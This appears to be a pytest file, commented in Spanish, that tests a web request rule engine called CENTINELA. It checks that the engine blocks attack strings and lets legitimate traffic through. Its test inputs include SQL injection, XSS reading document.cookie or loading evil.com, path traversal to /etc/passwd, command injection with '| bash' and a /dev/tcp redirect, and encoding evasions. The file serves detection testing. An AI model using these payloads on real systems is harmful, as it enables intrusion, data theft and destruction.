"""Casos positivos y negativos por categoría del motor de reglas deterministas (CENTINELA).

Cubre las 20 reglas del catálogo inicial (Fase 1 del Sprint 1) en las 6 categorías:
- sqli (SQL Injection)
- xss (Cross-Site Scripting)
- traversal (Path Traversal / LFI)
- cmdi (Command Injection)
- scanner (Escáneres y Reconocimiento)
- bruteforce (Fuerza Bruta)

Incluye además validación de evasiones (doble codificación URL, terminadores nulos,
separadores invertidos) y verificación de cero falsos positivos en tráfico legítimo.
"""
from __future__ import annotations

import pytest

from app.engine.normalizer import normalize
from app.engine.rules import RuleEngine


@pytest.fixture(scope="module")
def engine() -> RuleEngine:
    rule_engine = RuleEngine()
    rule_engine.load()
    return rule_engine


def _request(
    path: str = "/consulta.php",
    query: str = "",
    headers: dict[str, str] | None = None,
    body: str = "",
    method: str = "GET",
):
    return normalize(
        method=method,
        path=path,
        query_string=query,
        headers=headers or {},
        body=body.encode("utf-8"),
        src_ip="10.0.0.1",
    )


def test_rule_catalog_completeness(engine: RuleEngine) -> None:
    """Verifica que el catálogo cargue exactamente las 20 reglas contractuales."""
    assert len(engine.rules) == 20
    categories = {r.category for r in engine.rules}
    expected_categories = {"sqli", "xss", "traversal", "cmdi", "scanner", "bruteforce"}
    assert categories == expected_categories


# ============================================================================
# 1. SQL Injection (sqli)
# ============================================================================
@pytest.mark.parametrize(
    "query,expected_rule",
    [
        ("id=1' OR '1'='1", "CNT-SQLI-001"),
        ("id=1 UNION SELECT user,password FROM users", "CNT-SQLI-002"),
        ("id=1' AND SLEEP(5)--", "CNT-SQLI-004"),
        ("id=1; DROP TABLE usuarios", "CNT-SQLI-005"),
        ("id=1; DELETE FROM pagos WHERE id=2", "CNT-SQLI-005"),
        ("id=1' --", "CNT-SQLI-003"),
    ],
)
def test_sqli_is_blocked(engine: RuleEngine, query: str, expected_rule: str) -> None:
    verdict = engine.evaluate(_request(query=query))
    assert verdict.verdict == "block"
    assert verdict.category == "sqli"
    assert verdict.rule_id == expected_rule
    assert verdict.technique_id == "T1190"
    assert verdict.engine_us >= 0


# ============================================================================
# 2. Cross-Site Scripting (xss)
# ============================================================================
@pytest.mark.parametrize(
    "query,expected_rule",
    [
        ("comentario=<script>alert(1)</script>", "CNT-XSS-001"),
        ("comentario=<img src=x onerror=alert(1)>", "CNT-XSS-002"),
        ("url=javascript:alert(document.cookie)", "CNT-XSS-003"),
        ("contenido=<iframe src='http://evil.com'></iframe>", "CNT-XSS-004"),
        ("avatar=<svg onload=alert(1)>", "CNT-XSS-004"),
    ],
)
def test_xss_is_blocked(engine: RuleEngine, query: str, expected_rule: str) -> None:
    verdict = engine.evaluate(_request(query=query))
    assert verdict.verdict == "block"
    assert verdict.category == "xss"
    assert verdict.rule_id == expected_rule
    assert verdict.technique_id == "T1059.007"


# ============================================================================
# 3. Path Traversal / LFI (traversal)
# ============================================================================
@pytest.mark.parametrize(
    "path,query,expected_rule",
    [
        ("/descargar.php", "archivo=../../../../etc/passwd", "CNT-TRAVERSAL-001"),
        ("/descargar.php", "archivo=boot.ini", "CNT-TRAVERSAL-002"),
        ("/index.php", "page=php://filter/convert.base64-encode/resource=config", "CNT-TRAVERSAL-003"),
        ("/index.php", "page=file:///etc/hosts", "CNT-TRAVERSAL-003"),
    ],
)
def test_path_traversal_is_blocked(
    engine: RuleEngine, path: str, query: str, expected_rule: str
) -> None:
    verdict = engine.evaluate(_request(path=path, query=query))
    assert verdict.verdict == "block"
    assert verdict.category == "traversal"
    assert verdict.rule_id == expected_rule
    assert verdict.technique_id == "T1083"


# ============================================================================
# 4. Command Injection (cmdi)
# ============================================================================
@pytest.mark.parametrize(
    "query,expected_rule",
    [
        ("host=127.0.0.1; cat /etc/hosts", "CNT-CMDI-001"),
        ("host=127.0.0.1; whoami", "CNT-CMDI-001"),
        ("target=$(whoami)", "CNT-CMDI-002"),
        ("ip=127.0.0.1 | bash", "CNT-CMDI-003"),
        ("ip=127.0.0.1 > /dev/tcp/10.0.0.1/4444", "CNT-CMDI-003"),
    ],
)
def test_command_injection_is_blocked(
    engine: RuleEngine, query: str, expected_rule: str
) -> None:
    verdict = engine.evaluate(_request(query=query))
    assert verdict.verdict == "block"
    assert verdict.category == "cmdi"
    assert verdict.rule_id == expected_rule
    assert verdict.technique_id == "T1059"


# ============================================================================
# 5. Scanners y Reconocimiento (scanner)
# ============================================================================
def test_scanner_user_agent_in_headers_is_blocked(engine: RuleEngine) -> None:
    verdict = engine.evaluate(
        _request(headers={"User-Agent": "sqlmap/1.7.2#stable"})
    )
    assert verdict.verdict == "block"
    assert verdict.category == "scanner"
    assert verdict.rule_id == "CNT-SCANNER-001"
    assert verdict.technique_id == "T1595"


@pytest.mark.parametrize(
    "path,expected_rule",
    [
        ("/.env", "CNT-SCANNER-002"),
        ("/.git/config", "CNT-SCANNER-002"),
        ("/wp-admin/setup.php", "CNT-SCANNER-002"),
        ("/database.sql", "CNT-SCANNER-003"),
        ("/backup.bak", "CNT-SCANNER-003"),
        ("/archive.tar.gz", "CNT-SCANNER-003"),
    ],
)
def test_scanner_paths_are_blocked(engine: RuleEngine, path: str, expected_rule: str) -> None:
    verdict = engine.evaluate(_request(path=path))
    assert verdict.verdict == "block"
    assert verdict.category == "scanner"
    assert verdict.rule_id == expected_rule
    assert verdict.technique_id == "T1595.002"


# ============================================================================
# 6. Fuerza Bruta / Abuso de Credenciales (bruteforce)
# ============================================================================
@pytest.mark.parametrize(
    "query,expected_rule",
    [
        ("username=admin&password=admin", "CNT-BRUTEFORCE-001"),
        ("usuario=admin&clave=123456", "CNT-BRUTEFORCE-001"),
        ("user=maria&password=password", "CNT-BRUTEFORCE-002"),
        ("login=admin&pin=1234", "CNT-BRUTEFORCE-002"),
    ],
)
def test_bruteforce_is_blocked(engine: RuleEngine, query: str, expected_rule: str) -> None:
    verdict = engine.evaluate(_request(query=query))
    assert verdict.verdict == "block"
    assert verdict.category == "bruteforce"
    assert verdict.rule_id == expected_rule
    assert verdict.technique_id == "T1110"


# ============================================================================
# 7. Evasiones Avanzadas (Doble Codificación, Null Byte, Backslashes)
# ============================================================================
def test_double_url_encoding_sqli(engine: RuleEngine) -> None:
    # %2527 -> %27 -> ' tras doble decodificación
    verdict = engine.evaluate(_request(query="id=1%2527%20OR%20%25271%2527%3D%25271"))
    assert verdict.verdict == "block"
    assert verdict.category == "sqli"


def test_null_byte_truncation_traversal(engine: RuleEngine) -> None:
    # %00 neutralizado por el normalizador para exponer la extensión real
    verdict = engine.evaluate(
        _request(path="/descargar.php", query="archivo=../../../../etc/passwd%00.png")
    )
    assert verdict.verdict == "block"
    assert verdict.category == "traversal"


def test_backslash_traversal_evasion(engine: RuleEngine) -> None:
    # ..\..\ convertido a ../../ por el normalizador
    verdict = engine.evaluate(
        _request(path="/descargar.php", query="archivo=..\\..\\..\\..\\etc\\passwd")
    )
    assert verdict.verdict == "block"
    assert verdict.category == "traversal"


def test_plus_sign_as_space_sqli(engine: RuleEngine) -> None:
    # '+' traducido a espacio para evitar evasión de WAF en query string
    verdict = engine.evaluate(_request(query="cedula=1'+UNION+SELECT+user,password+FROM+mysql.user--"))
    assert verdict.verdict == "block"
    assert verdict.category == "sqli"


# ============================================================================
# 8. Tráfico Legítimo (Cero Falsos Positivos)
# ============================================================================
@pytest.mark.parametrize(
    "path,query,body",
    [
        ("/consulta.php", "id=42", ""),
        ("/consulta.php", "nombre=Maria%20Perez", ""),
        ("/pago.php", "monto=150.50&concepto=pago+de+tasa+administrativa", ""),
        ("/tickets", "cedula=V12345678&fecha=2026-11-14", ""),
        ("/validar", "codigo=ABC123XYZ", ""),
        ("/descargar.php", "archivo=recibo_0001.txt", ""),
        ("/comprobante", "archivo=comprobante_fiscal_2026.pdf", ""),
        ("/tickets", "", "comentario=Solicito+actualizacion+de+clave+personal"),
    ],
)
def test_legit_traffic_is_allowed(
    engine: RuleEngine, path: str, query: str, body: str
) -> None:
    verdict = engine.evaluate(
        _request(
            path=path,
            query=query,
            body=body,
            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
        )
    )
    assert verdict.verdict == "allow"
    assert verdict.rule_id is None
    assert verdict.category is None
